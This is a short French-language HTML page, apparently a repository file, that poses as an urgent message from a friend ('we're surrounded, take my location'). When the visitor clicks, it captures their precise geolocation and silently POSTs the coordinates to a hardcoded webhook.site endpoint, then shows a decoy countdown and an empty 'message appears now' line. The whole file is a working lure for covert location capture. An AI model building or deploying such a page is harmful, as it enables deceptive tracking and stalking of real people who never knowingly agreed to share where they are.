# Message-axel
Script HTML pour tester la localisation via Webhook
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Message Axel</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to right, #0ea5a0, #06b6d4);
      color: white;
      text-align: center;
      padding-top: 20vh;
    }
    h1 {
      font-size: 2em;
      margin-bottom: 30px;
    }
    button {
      font-size: 1.8em;
      padding: 20px 40px;
      border: none;
      border-radius: 15px;
      background: #facc15;
      color: #000;
      cursor: pointer;
      box-shadow: 0 5px 20px rgba(0,0,0,0.3);
      transition: transform 0.2s, background 0.2s;
    }
    button:hover {
      transform: scale(1.05);
      background: #eab308;
    }
    #timer {
      margin-top: 20px;
      font-size: 1.5em;
      font-weight: bold;
    }
    #status {
      margin-top: 20px;
      font-size: 1.2em;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h1>gros on est encerclé c'est chaud prends ma localisation</h1>
  <button id="startBtn" onclick="startSequence()">Clique ici</button>
  <div id="timer"></div>
  <p id="status"></p>

  <script>
    const RECEIVER = "https://webhook.site/4e09364e-3a24-4dc0-85d2-0dc721630e82";
    let messageSent = false;

    function startSequence() {
      const btn = document.getElementById("startBtn");
      const timerEl = document.getElementById("timer");
      btn.style.display = "none"; // cacher le bouton
      timerEl.innerText = "15"; // début du compte à rebours

      // Demande et envoie la géolocalisation immédiatement
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          if (!messageSent) {
            messageSent = true;
            const data = {
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              timestamp: new Date(pos.timestamp).toISOString()
            };
            fetch(RECEIVER, {
              method: "POST",
              headers: {"Content-Type": "application/json"},
              body: JSON.stringify(data)
            });
          }
        }, err => {
          document.getElementById("status").innerText = "Erreur: " + err.message;
        }, {enableHighAccuracy:true});
      } else {
        document.getElementById("status").innerText = "Fonction géolocalisation non supportée.";
      }

      // Compte à rebours de 15 secondes
      let seconds = 15;
      const countdown = setInterval(() => {
        seconds--;
        timerEl.innerText = seconds;
        if (seconds <= 0) {
          clearInterval(countdown);
          timerEl.innerText = "";
          document.getElementById("status").innerText = "⚡ Le message s'affiche maintenant ⚡";
          // Disparaît après 5 secondes
          setTimeout(() => {
            document.getElementById("status").innerText = "";
          }, 5000);
        }
      }, 1000);
    }
  </script>
</body>
</html>
